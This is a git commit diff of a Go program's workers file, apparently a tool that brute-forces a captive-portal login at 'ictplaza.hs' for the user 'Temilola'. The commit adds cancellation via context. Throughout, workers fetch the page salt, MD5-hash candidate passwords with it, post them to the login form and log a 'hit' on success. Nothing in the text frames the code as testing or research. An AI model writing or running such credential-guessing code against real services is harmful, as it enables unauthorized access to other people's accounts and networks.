dbe5ec6d2f584565a2fe81d913c09d716d0eb052
h4ckit <dammysteve10@gmail.com>
2022-05-03 21:12:20 +0100

    Workers Now Listen For Cancellation

--- workers/workers.go
+++ workers/workers.go
@@ -1,6 +1,7 @@
 package workers
 
 import (
+	"context"
 	"fmt"
 	"io/ioutil"
 	"log"
@@ -18,120 +19,86 @@ type worker struct {
 	errorJob string
 }
 
-/*func (w *worker) ListenAndExecute(str string, poolChan chan<- *worker) {
-
-	fmt.Printf("Worker %s processing job %s\n", w.name, str)
-	defer func() {
-		poolChan <- w
-	}()
-
-	var salt string
-
-	if w.errorJob != "" {
-		w.errorJob = ""
-	}
-
-	if w.lastHash == "" {
-		fmt.Printf("Worker %s Doesn't Have A Salt, Getting A New One\n", w.name)
-		resp, err := http.Get("http://ictplaza.hs/login")
-
-		if err != nil {
-			log.Printf("something went wrong and worker %s couldn't get salt", w.name)
-			w.errorJob = str
-			return
-		}
-
-		fmt.Println("Here")
-		body, _ := ioutil.ReadAll(resp.Body)
-		fmt.Println("But Not Here")
-
-		fmt.Println(string(body))
-
-		_ = resp.Body.Close()
-
-		salt = util.ExtractSalt(string(body), str)
-	} else {
-		salt = util.ExtractSalt(w.lastHash, str)
-	}
-
-	hash := mdfive.Hash(salt)
-
-	fmt.Println("We're Here")
-
-	resp, err := http.PostForm("http://ictplaza.hs/login", url.Values{"username": {"Temilola"}, "password": {hash}})
-
-	if err != nil {
-		log.Printf("something went wrong and worker %s couldn't complete the request", w.name)
-		w.errorJob = str
-		return
-	}
-
-	body, _ := ioutil.ReadAll(resp.Body)
-	_ = resp.Body.Close()
-
-	if util.CheckForSuccess(string(body)) {
-		log.Println("I Found A Fucking Hit")
-	}
-}*/
-
 func New(id int) *worker {
 	return &worker{
 		name: strconv.Itoa(id),
 	}
 }
 
-func (w *worker) ListenAndExecute(jobChan <-chan string) {
+func (w *worker) ListenAndExecute(jobChan <-chan string, ctx context.Context) {
+	hashMan := mdfive.New()
 
 	for str := range jobChan {
-		fmt.Printf("Worker %s processing job %s\n", w.name, str)
+		select {
+		case <-ctx.Done():
+			return
+		default:
+			fmt.Printf("Worker %s processing job %s\n", w.name, str)
 
-		var salt string
+			var (
+				salt    string
+				rawSalt string
+			)
 
-		if w.errorJob != "" {
-			w.errorJob = ""
-		}
+			if w.errorJob != "" {
+				w.errorJob = ""
+			}
 
-		if w.lastHash == "" {
-			fmt.Printf("Worker %s Doesn't Have A Salt, Getting A New One\n", w.name)
-			resp, err := http.Get("http://ictplaza.hs/login")
+			if w.lastHash == "" {
+				fmt.Printf("Worker %s Doesn't Have A Salt, Getting A New One\n", w.name)
+				resp, err := http.Get("http://ictplaza.hs/login")
+
+				if err != nil {
+					log.Printf("something went wrong and worker %s couldn't get salt", w.name)
+					w.errorJob = str
+					return
+				}
+
+				body, _ := ioutil.ReadAll(resp.Body)
+
+				_ = resp.Body.Close()
+
+				if util.CheckForSuccess(string(body)) {
+					fmt.Println("Already Logged In")
+					return
+				}
+
+				rawSalt = util.ExtractSalt(string(body), str)
+
+			} else {
+				//	fmt.Printf("Last Salt: %s\n", w.lastHash)
+				rawSalt = util.ExtractSalt(w.nextSalt, str)
+			}
+
+			salt = util.Saltify(rawSalt)
+			fmt.Println("Current Raw Salt: ", rawSalt)
+			//fmt.Println("Current Salt: ", salt)
+			hash := hashMan.Hash(salt)
+
+			fmt.Printf("Hash For %s: %v\n", str, hash)
+
+			resp, err := http.DefaultClient.PostForm("http://ictplaza.hs/login", url.Values{"username": {"Temilola"}, "password": {hash}, "dst": {""}, "popup": {"true"}})
 
 			if err != nil {
-				log.Printf("something went wrong and worker %s couldn't get salt", w.name)
+				log.Printf("something went wrong and worker %s couldn't complete the request", w.name)
 				w.errorJob = str
 				return
 			}
 
 			body, _ := ioutil.ReadAll(resp.Body)
-
 			_ = resp.Body.Close()
 
-			salt = util.ExtractSalt(string(body), str)
-		} else {
-			fmt.Printf("Last Salt: %s\n", w.lastHash)
-			salt = util.ExtractSalt(w.nextSalt, str)
+			if util.CheckForSuccess(string(body)) {
+				log.Println("I Found A Fucking Hit")
+				return
+			} else {
+				w.lastHash = rawSalt
+				w.nextSalt = util.ExtractSalt(string(body), str)
+			}
+
+			//time.Sleep(2 * time.Second)
+
 		}
 
-		fmt.Println("Current Salt: ", salt)
-		hash := mdfive.Hash(salt)
-
-		fmt.Println("Hash: ", hash)
-
-		resp, err := http.PostForm("http://ictplaza.hs/login", url.Values{"username": {"Temilola"}, "password": {hash}, "dst": {""}, "popup": {"true"}})
-
-		if err != nil {
-			log.Printf("something went wrong and worker %s couldn't complete the request", w.name)
-			w.errorJob = str
-			return
-		}
-
-		body, _ := ioutil.ReadAll(resp.Body)
-		_ = resp.Body.Close()
-
-		if util.CheckForSuccess(string(body)) {
-			log.Println("I Found A Fucking Hit")
-		} else {
-			w.lastHash = salt
-			w.nextSalt = util.ExtractSalt(string(body), str)
-		}
 	}
 }
